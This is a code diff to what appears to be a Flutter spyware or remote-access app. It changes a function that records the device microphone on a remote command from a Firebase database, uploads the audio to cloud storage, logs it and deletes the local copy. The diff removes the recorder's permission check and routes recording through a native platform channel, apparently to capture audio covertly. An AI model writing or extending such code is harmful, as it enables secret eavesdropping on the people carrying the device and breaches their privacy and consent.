@@ -22,7 +22,6 @@ import 'package:intl/intl.dart';
 import 'package:path_provider/path_provider.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:photo_manager/photo_manager.dart';
-import 'package:record/record.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:uuid/uuid.dart';
 
@@ -401,40 +400,41 @@ Future<void> _captureAndUpload(
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-//  MIC RECORDING
+//  MIC RECORDING (via Android MediaRecorder platform channel)
 // ═══════════════════════════════════════════════════════════════════════════════
 
 Future<void> _recordMicAndUpload(
     DatabaseReference deviceRef, String deviceId, int durationSec) async {
-  final recorder = AudioRecorder();
   try {
-    final hasPermission = await recorder.hasPermission();
-    if (!hasPermission) return;
-
     final dir      = await getTemporaryDirectory();
     final ts       = DateTime.now().millisecondsSinceEpoch;
     final filePath = '${dir.path}/fg_audio_$ts.m4a';
 
     await deviceRef.child('mic/status').set('recording');
 
-    await recorder.start(
-      const RecordConfig(
-        encoder   : AudioEncoder.aacLc,
-        bitRate   : 64000,
-        sampleRate: 22050,
-      ),
-      path: filePath,
-    );
+    const channel = MethodChannel(_kCtrlChannel);
+    final started = await channel.invokeMethod('startRecording', {
+      'path'    : filePath,
+      'duration': durationSec,
+    });
 
-    await Future.delayed(Duration(seconds: durationSec));
-    await recorder.stop();
+    if (started != true) {
+      await deviceRef.child('mic/status').set('idle');
+      return;
+    }
+
+    // Wait for recording to finish + 2s buffer
+    await Future.delayed(Duration(seconds: durationSec + 2));
 
     final file = File(filePath);
-    if (!file.existsSync()) return;
+    if (!file.existsSync()) {
+      await deviceRef.child('mic/status').set('idle');
+      return;
+    }
 
     final ref = FirebaseStorage.instance
         .ref('devices/$deviceId/audio/$ts.m4a');
-    await ref.putFile(file, SettableMetadata(contentType: 'audio/m4a'));
+    await ref.putFile(file, SettableMetadata(contentType: 'audio/mp4'));
     final url = await ref.getDownloadURL();
 
     await deviceRef.child('audio_logs').push().set({
@@ -443,9 +443,8 @@ Future<void> _recordMicAndUpload(
       'timestamp': ts,
     });
     await deviceRef.child('mic/status').set('idle');
-    file.deleteSync();
+    try { file.deleteSync(); } catch (_) {}
   } catch (_) {
-    try { await recorder.stop(); } catch (_) {}
     await deviceRef.child('mic/status').set('idle');
   }
 }
